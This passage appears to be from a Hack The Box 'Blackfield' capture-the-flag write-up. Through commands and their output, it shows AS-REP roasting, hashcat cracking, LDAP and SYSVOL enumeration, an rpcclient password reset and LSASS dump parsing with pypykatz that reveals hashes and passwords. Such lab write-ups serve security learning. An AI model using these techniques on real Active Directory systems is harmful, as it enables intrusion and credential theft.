+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	 SOA dc01.BLACKFIELD.local 10.10.10.192
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	 NS dc01.BLACKFIELD.local 10.10.10.192
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	 NS dc01.BLACKFIELD.local dead:beef::bcb9:6997:c8be:2c1e
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Could not Resolve MX Records <span style="color:#66d9ef">for</span> BLACKFIELD.local
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	 A BLACKFIELD.local 10.10.10.192
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerating SRV Records
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kerberos._udp.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">88</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kerberos._udp.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">88</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">389</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">389</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kerberos._tcp.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">88</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kerberos._tcp.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">88</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _gc._tcp.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">3268</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _gc._tcp.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">3268</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.pdc._msdcs.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">389</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.pdc._msdcs.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">389</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.ForestDNSZones.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">389</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.ForestDNSZones.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">389</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.dc._msdcs.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">389</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.dc._msdcs.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">389</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kpasswd._tcp.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">464</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kpasswd._tcp.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">464</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kerberos._tcp.dc._msdcs.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">88</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kerberos._tcp.dc._msdcs.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">88</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kpasswd._udp.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">464</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kpasswd._udp.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">464</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.gc._msdcs.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">3268</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.gc._msdcs.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">3268</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#ae81ff">22</span> Records Found
+
+</code></pre></div><ol start="5">
+<li>Get Kerberos tickets:</li>
+</ol>
+<pre><code># cat users.txt | while read u; do GetNPUsers.py BLACKFIELD.local/${u} -dc-ip 10.10.10.192 -no-pass; done
+...
+[*] Getting TGT for support
+$krb5asrep$23$support@BLACKFIELD.LOCAL:b291b9dfbad5a15a2fe622d597db5fd1$ee82925980a5e5adcdd235ef292b0c258aba9292d27417a581a4f8cf728383f4d589ab517539528fc6d3e5e7397036c11dd0375310b577bb8e76af07f4e62a1ba97b71aafdcb0eacb0dc8450ea6a92079208ed2353ab1756420ed65c66ce7b41cf2deb8dd0e920d7d5c8c9ce124db5857941db7e370811a4899b9e8273b430187c3f0238db1286a140a2a42cfcd82e1dba2f11ca4461c7dcf08cb4a1dcc49b9a5a513d058871a5c58bbb2b20d92a71ed1dc78c0e641228b951ab047c111b00d37fd3e4cdadf5edd91cc75a745bef770bb23c0dda85719f7572b01580eb47ea897695c99b418aa278b526e3a86d2ec581bbe23464
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+</code></pre><ol start="6">
+<li>Cracking with <code>hashcat</code>:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat --force -d <span style="color:#ae81ff">1</span> -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">18200</span> support.hash ../wordlists/rockyou.txt
+
+hashcat <span style="color:#f92672">(</span>v5.1.0-1846-gf92df252<span style="color:#f92672">)</span> starting...
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be <span style="color:#66d9ef">done</span> when debugging.
+Do not report hashcat issues encountered when using --force.
+/sys/bus/pci/devices/0000:00:00.0/pp_dpm_pcie: No such file or directory
+
+/sys/bus/pci/devices/0000:00:00.0/pp_dpm_sclk: No such file or directory
+
+First_file_in_directory<span style="color:#f92672">()</span> failed.
+
+/sys/bus/pci/devices/0000:00:00.0/pp_dpm_mclk: No such file or directory
+
+First_file_in_directory<span style="color:#f92672">()</span> failed.
+
+OpenCL API <span style="color:#f92672">(</span>OpenCL 1.1 Mesa 20.0.7<span style="color:#f92672">)</span> - Platform <span style="color:#75715e">#1 [Mesa]</span>
+<span style="color:#f92672">========================================================</span>
+* Device <span style="color:#75715e">#1: Radeon RX 580 Series (POLARIS10, DRM 3.36.0, 5.6.15-arch1-1, LLVM 10.0.0), 8128/8192 MB (6553 MB allocatable), 36MCU</span>
+
+OpenCL API <span style="color:#f92672">(</span>OpenCL 2.1 AMD-APP <span style="color:#f92672">(</span>3075.10<span style="color:#f92672">))</span> - Platform <span style="color:#75715e">#2 [Advanced Micro Devices, Inc.]</span>
+<span style="color:#f92672">======================================================================================</span>
+* Device <span style="color:#75715e">#2: Ellesmere, skipped</span>
+
+Minimum password length supported by kernel: <span style="color:#ae81ff">0</span>
+Maximum password length supported by kernel: <span style="color:#ae81ff">256</span>
+
+Hashes: <span style="color:#ae81ff">1</span> digests; <span style="color:#ae81ff">1</span> unique digests, <span style="color:#ae81ff">1</span> unique salts
+Bitmaps: <span style="color:#ae81ff">16</span> bits, <span style="color:#ae81ff">65536</span> entries, 0x0000ffff mask, <span style="color:#ae81ff">262144</span> bytes, 5/13 rotates
+Rules: <span style="color:#ae81ff">1</span>
+
+Applicable optimizers:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure <span style="color:#f92672">(</span>unoptimized<span style="color:#f92672">)</span> backend kernels selected.
+Using pure kernels enables cracking longer passwords but <span style="color:#66d9ef">for</span> the price of drastically reduced performance.
+If you want to switch to optimized backend kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required <span style="color:#66d9ef">for</span> this attack: <span style="color:#ae81ff">696</span> MB
+
+Dictionary cache built:                                                     
+* Filename..: ../wordlists/rockyou.txt
+* Passwords.: <span style="color:#ae81ff">14344391</span>
+* Bytes.....: <span style="color:#ae81ff">139921497</span>
+* Keyspace..: <span style="color:#ae81ff">14344384</span>
+* Runtime...: <span style="color:#ae81ff">2</span> secs
+
+Approaching final keyspace - workload adjusted.  
+
+$krb5asrep$23$support@BLACKFIELD.LOCAL:b291b9dfbad5a15a2fe622d597db5fd1$ee82925980a5e5adcdd235ef292b0c258aba9292d27417a581a4f8cf728383f4d589ab517539528fc6d3e5e7397036c11dd0375310b577bb8e76af07f4e62a1ba97b71aafdcb0eacb0dc8450ea6a92079208ed2353ab1756420ed65c66ce7b41cf2deb8dd0e920d7d5c8c9ce124db5857941db7e370811a4899b9e8273b430187c3f0238db1286a140a2a42cfcd82e1dba2f11ca4461c7dcf08cb4a1dcc49b9a5a513d058871a5c58bbb2b20d92a71ed1dc78c0e641228b951ab047c111b00d37fd3e4cdadf5edd91cc75a745bef770bb23c0dda85719f7572b01580eb47ea897695c99b418aa278b526e3a86d2ec581bbe23464:#00^BlackKnight
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, AS-REP
+Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:b291b9dfbad5...e23464
+Time.Started.....: Tue Jun  <span style="color:#ae81ff">9</span> 21:42:59 2020, <span style="color:#f92672">(</span><span style="color:#ae81ff">7</span> secs<span style="color:#f92672">)</span>
+Time.Estimated...: Tue Jun  <span style="color:#ae81ff">9</span> 21:43:06 2020, <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
+Guess.Base.......: File <span style="color:#f92672">(</span>../wordlists/rockyou.txt<span style="color:#f92672">)</span>
+Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+Speed.#1.........:  2202.9 kH/s <span style="color:#f92672">(</span>7.55ms<span style="color:#f92672">)</span> @ Accel:64 Loops:1 Thr:64 Vec:1
+Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests
+Progress.........: 14344384/14344384 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+Rejected.........: 0/14344384 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
+Restore.Point....: 14303232/14344384 <span style="color:#f92672">(</span>99.71%<span style="color:#f92672">)</span>
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: $HEX<span style="color:#f92672">[</span>2a627269616e6e653031322a<span style="color:#f92672">]</span> -&gt; $HEX<span style="color:#f92672">[</span>042a0337c2a156616d6f732103<span style="color:#f92672">]</span>
+Hardware.Mon.#1..: N/A
+
+Started: Tue Jun  <span style="color:#ae81ff">9</span> 21:42:56 <span style="color:#ae81ff">2020</span>
+Stopped: Tue Jun  <span style="color:#ae81ff">9</span> 21:43:07 <span style="color:#ae81ff">2020</span>
+</code></pre></div><p>We got a password: <code>#00^BlackKnight</code></p>
+<ol start="7">
+<li>Dump LDAP domain data:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ldapdomaindump -u BLACKFIELD.LOCAL<span style="color:#ae81ff">\\</span>support -p <span style="color:#e6db74">&#34;#00^BlackKnight&#34;</span> -o ldapdomaindump_artifacts 10.10.10.192       
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connecting to host...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Binding to host
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Bind OK
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting domain dump
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Domain dump finished
+</code></pre></div><p>We get these files</p>
+<pre><code>ldapdomaindump_artifacts
+├── domain_computers_by_os.html
+├── domain_computers.grep
+├── domain_computers.html
+├── domain_computers.json
+├── domain_groups.grep
+├── domain_groups.html
+├── domain_groups.json
+├── domain_policy.grep
+├── domain_policy.html
+├── domain_policy.json
+├── domain_trusts.grep
+├── domain_trusts.html
+├── domain_trusts.json
+├── domain_users_by_group.html
+├── domain_users.grep
+├── domain_users.html
+└── domain_users.json
+</code></pre><ol start="8">
+<li>Discovered a possible target:</li>
+</ol>
+<pre><code>SAM name: svc_backup
+Member of groups: Remote Management Users, Backup Operators
+Flags: NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD
+</code></pre><ol start="9">
+<li>Get data from <code>SYSVOL</code>:</li>
+</ol>
+<pre><code>smbclient -U support //10.10.10.192/SYSVOL
+smbclient: Can't load /etc/samba/smb.conf - run testparm to debug it
+Enter WORKGROUP\support's password: #00^BlackKnight
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sun Feb 23 12:13:05 2020
+  ..                                  D        0  Sun Feb 23 12:13:05 2020
+  BLACKFIELD.local                    D        0  Sun Feb 23 12:13:05 2020
+
+		7846143 blocks of size 4096. 3490417 blocks available
+
+smb: \&gt; cd BLACKFIELD.local
+
+smb: \BLACKFIELD.local\&gt; ls
+  .                                   D        0  Sun Feb 23 12:19:28 2020
+  ..                                  D        0  Sun Feb 23 12:19:28 2020
+  DfsrPrivate                       DHS        0  Sun Feb 23 12:19:28 2020
+  Policies                            D        0  Sun Feb 23 12:13:14 2020
+  scripts                             D        0  Sun Feb 23 12:13:05 2020
+
+		7846143 blocks of size 4096. 3490412 blocks available
+
+smb: \BLACKFIELD.local\&gt; mget *
+NT_STATUS_ACCESS_DENIED listing \BLACKFIELD.local\DfsrPrivate\*
+getting file \BLACKFIELD.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 22 as GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+getting file \BLACKFIELD.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as GptTmpl.inf (7.3 KiloBytes/sec) (average 3.7 KiloBytes/sec)
+getting file \BLACKFIELD.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2796 as Registry.pol (18.6 KiloBytes/sec) (average 8.7 KiloBytes/sec)
+getting file \BLACKFIELD.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as GPT.INI (0.1 KiloBytes/sec) (average 6.6 KiloBytes/sec)
+getting file \BLACKFIELD.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3764 as GptTmpl.inf (25.2 KiloBytes/sec) (average 10.3 KiloBytes/sec)
+smb: \BLACKFIELD.local\&gt;
+</code></pre><ol start="10">
+<li>Getting files content revealed group policy files:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ini" data-lang="ini"><span style="color:#a6e22e">iconv -f UTF-16 -t UTF-8 &#34;./Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf&#34;</span>
+<span style="color:#66d9ef">[Unicode]</span>
+<span style="color:#a6e22e">Unicode</span><span style="color:#f92672">=</span><span style="color:#e6db74">yes</span>
+<span style="color:#66d9ef">[Registry Values]</span>
+<span style="color:#a6e22e">MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity</span><span style="color:#f92672">=</span><span style="color:#e6db74">4,1</span>
+<span style="color:#a6e22e">MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal</span><span style="color:#f92672">=</span><span style="color:#e6db74">4,1</span>
+<span style="color:#a6e22e">MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature</span><span style="color:#f92672">=</span><span style="color:#e6db74">4,1</span>
+<span style="color:#a6e22e">MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature</span><span style="color:#f92672">=</span><span style="color:#e6db74">4,1</span>
+<span style="color:#66d9ef">[Privilege Rights]</span>
+<span style="color:#a6e22e">SeAssignPrimaryTokenPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-20,*S-1-5-19</span>
+<span style="color:#a6e22e">SeAuditPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-20,*S-1-5-19</span>
+<span style="color:#a6e22e">SeBackupPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544</span>
+<span style="color:#a6e22e">SeBatchLogonRight</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-559,*S-1-5-32-551,*S-1-5-32-544</span>
+<span style="color:#a6e22e">SeChangeNotifyPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-554,*S-1-5-11,*S-1-5-32-544,*S-1-5-20,*S-1-5-19,*S-1-1-0</span>
+<span style="color:#a6e22e">SeCreatePagefilePrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
+<span style="color:#a6e22e">SeDebugPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
+<span style="color:#a6e22e">SeIncreaseBasePriorityPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-90-0,*S-1-5-32-544</span>
+<span style="color:#a6e22e">SeIncreaseQuotaPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544,*S-1-5-20,*S-1-5-19</span>
+<span style="color:#a6e22e">SeInteractiveLogonRight</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-9,*S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-548,*S-1-5-32-551,*S-1-5-32-544</span>
+<span style="color:#a6e22e">SeLoadDriverPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-550,*S-1-5-32-544</span>
+<span style="color:#a6e22e">SeMachineAccountPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-11</span>
+<span style="color:#a6e22e">SeNetworkLogonRight</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-554,*S-1-5-9,*S-1-5-11,*S-1-5-32-544,*S-1-1-0</span>
+<span style="color:#a6e22e">SeProfileSingleProcessPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
+<span style="color:#a6e22e">SeRemoteShutdownPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-549,*S-1-5-32-544</span>
+<span style="color:#a6e22e">SeRestorePrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544</span>
+<span style="color:#a6e22e">SeSecurityPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
+<span style="color:#a6e22e">SeShutdownPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544</span>
+<span style="color:#a6e22e">SeSystemEnvironmentPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
+<span style="color:#a6e22e">SeSystemProfilePrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420,*S-1-5-32-544</span>
+<span style="color:#a6e22e">SeSystemTimePrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-549,*S-1-5-32-544,*S-1-5-19</span>
+<span style="color:#a6e22e">SeTakeOwnershipPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
+<span style="color:#a6e22e">SeUndockPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
+<span style="color:#a6e22e">SeEnableDelegationPrivilege</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">*S-1-5-32-544</span>
+<span style="color:#66d9ef">[Version]</span>
+<span style="color:#a6e22e">signature</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;$CHICAGO$&#34;</span>
+<span style="color:#a6e22e">Revision</span><span style="color:#f92672">=</span><span style="color:#e6db74">1</span>
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<ol>
+<li>We can try to <a href="https://malicious.link/post/2017/reset-ad-user-password-with-linux/">change password</a> for <code>audit2020</code> user:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rpcclient -U support //10.10.10.192
+Enter WORKGROUP<span style="color:#ae81ff">\s</span>upport<span style="color:#e6db74">&#39;s password: #00^BlackKnight
+</span><span style="color:#e6db74">rpcclient $&gt; setuserinfo2 audit2020 23 &#39;</span>Password!<span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">rpcclient $&gt; exit
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">smbclient -U audit2020 //10.10.10.192/forensic
+</span><span style="color:#e6db74">Enter WORKGROUP\audit2020&#39;</span>s password: Password!
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> ls
+  .                                   D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 14:03:16 <span style="color:#ae81ff">2020</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 14:03:16 <span style="color:#ae81ff">2020</span>
+  commands_output                     D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 19:14:37 <span style="color:#ae81ff">2020</span>
+  memory_analysis                     D        <span style="color:#ae81ff">0</span>  Thu May <span style="color:#ae81ff">28</span> 22:28:33 <span style="color:#ae81ff">2020</span>
+  tools                               D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 14:39:08 <span style="color:#ae81ff">2020</span>
+
+		<span style="color:#ae81ff">7846143</span> blocks of size 4096. <span style="color:#ae81ff">3825653</span> blocks available
+smb: <span style="color:#ae81ff">\&gt;</span> mget *
+NT_STATUS_NO_SUCH_FILE listing <span style="color:#ae81ff">\*</span>
+smb: <span style="color:#ae81ff">\&gt;</span>
+
+</code></pre></div><ol start="2">
+<li>I tried using <code>smbclient.py</code> from Impacket instead.</li>
+</ol>
+<pre><code>smbclient.py audit2020@10.10.10.192
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+Password: Password!
+Type help for list of commands
+# shares
+ADMIN$
+C$
+forensic
+IPC$
+NETLOGON
+profiles$
+SYSVOL
+
+# use forensic
+# ls
+drw-rw-rw-          0  Sun Feb 23 16:10:16 2020 .
+drw-rw-rw-          0  Sun Feb 23 16:10:16 2020 ..
+drw-rw-rw-          0  Sun Feb 23 19:14:37 2020 commands_output
+drw-rw-rw-          0  Thu May 28 22:29:24 2020 memory_analysis
+drw-rw-rw-          0  Fri Feb 28 23:30:34 2020 tools
+
+# cd memory_analysis
+# ls
+drw-rw-rw-          0  Thu May 28 22:29:24 2020 .
+drw-rw-rw-          0  Thu May 28 22:29:24 2020 ..
+-rw-rw-rw-   37876530  Thu May 28 22:29:24 2020 conhost.zip
+-rw-rw-rw-   24962333  Thu May 28 22:29:24 2020 ctfmon.zip
+-rw-rw-rw-   23993305  Thu May 28 22:29:24 2020 dfsrs.zip
+-rw-rw-rw-   18366396  Thu May 28 22:29:24 2020 dllhost.zip
+-rw-rw-rw-    8810157  Thu May 28 22:29:24 2020 ismserv.zip
+-rw-rw-rw-   41936098  Thu May 28 22:29:24 2020 lsass.zip
+-rw-rw-rw-   64288607  Thu May 28 22:29:24 2020 mmc.zip
+-rw-rw-rw-   13332174  Thu May 28 22:29:24 2020 RuntimeBroker.zip
+-rw-rw-rw-  131983313  Thu May 28 22:29:24 2020 ServerManager.zip
+-rw-rw-rw-   33141744  Thu May 28 22:29:24 2020 sihost.zip
+-rw-rw-rw-   33756344  Thu May 28 22:29:24 2020 smartscreen.zip
+-rw-rw-rw-   14408833  Thu May 28 22:29:24 2020 svchost.zip
+-rw-rw-rw-   34631412  Thu May 28 22:29:24 2020 taskhostw.zip
+-rw-rw-rw-   14255089  Thu May 28 22:29:24 2020 winlogon.zip
+-rw-rw-rw-    4067425  Thu May 28 22:29:24 2020 wlms.zip
+-rw-rw-rw-   18303252  Thu May 28 22:29:24 2020 WmiPrvSE.zip
+
+# get lsass.zip
+# exit
+</code></pre><ol start="3">
+<li>From all these files in lsass.zip we need <code>lsass.DMP</code> to <a href="https://medium.com/@ali.bawazeeer/using-mimikatz-to-get-cleartext-password-from-offline-memory-dump-76ed09fd3330">extract password</a> later using <a href="https://github.com/gentilkiwi/mimikatz/releases">mimikatz</a>:</li>
+</ol>
+<p>Because I refuse to use windows I resorted to using <a href="https://github.com/skelsec/pypykatz">pypykatz</a> instead of mimikatz.</p>
+<pre><code>pypykatz lsa minidump lsass.DMP                    
+INFO:root:Parsing file lsass.DMP
+FILE: ======== lsass.DMP =======
+== LogonSession ==
+authentication_id 406458 (633ba)
+session_id 2
+username svc_backup
+domainname BLACKFIELD
+logon_server DC01
+logon_time 2020-02-23T18:00:03.423728+00:00
+sid S-1-5-21-4194615774-2175524697-3563712290-1413
+luid 406458
+	== MSV ==
+		Username: svc_backup
+		Domain: BLACKFIELD
+		LM: NA
+		NT: 9658d1d1dcd9250115e2205d9f48400d
+		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
+	== WDIGEST [633ba]==
+		username svc_backup
+		domainname BLACKFIELD
+		password None
+	== SSP [633ba]==
+		username
+		domainname
+		password None
+	== Kerberos ==
+		Username: svc_backup
+		Domain: BLACKFIELD.LOCAL
+		Password: None
+	== WDIGEST [633ba]==
+		username svc_backup
+		domainname BLACKFIELD
+		password None
+
+== LogonSession ==
+authentication_id 365835 (5950b)
+session_id 2
+username UMFD-2
+domainname Font Driver Host
+logon_server
+logon_time 2020-02-23T17:59:38.218491+00:00
+sid S-1-5-96-0-2
+luid 365835
+	== MSV ==
+		Username: DC01$
+		Domain: BLACKFIELD
+		LM: NA
+		NT: b624dc83a27cc29da11d9bf25efea796
+		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+	== WDIGEST [5950b]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+	== Kerberos ==
+		Username: DC01$
+		Domain: BLACKFIELD.local
+		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6
+	== WDIGEST [5950b]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+
+== LogonSession ==
+authentication_id 365493 (593b5)
+session_id 2
+username UMFD-2
+domainname Font Driver Host
+logon_server
+logon_time 2020-02-23T17:59:38.200147+00:00
+sid S-1-5-96-0-2
+luid 365493
+	== MSV ==
+		Username: DC01$
+		Domain: BLACKFIELD
+		LM: NA
+		NT: b624dc83a27cc29da11d9bf25efea796
+		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+	== WDIGEST [593b5]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+	== Kerberos ==
+		Username: DC01$
+		Domain: BLACKFIELD.local
+		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6
+	== WDIGEST [593b5]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+
+== LogonSession ==
+authentication_id 257142 (3ec76)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server
+logon_time 2020-02-23T17:59:13.318909+00:00
+sid S-1-5-18
+luid 257142
+	== Kerberos ==
+		Username: DC01$
+		Domain: BLACKFIELD.LOCAL
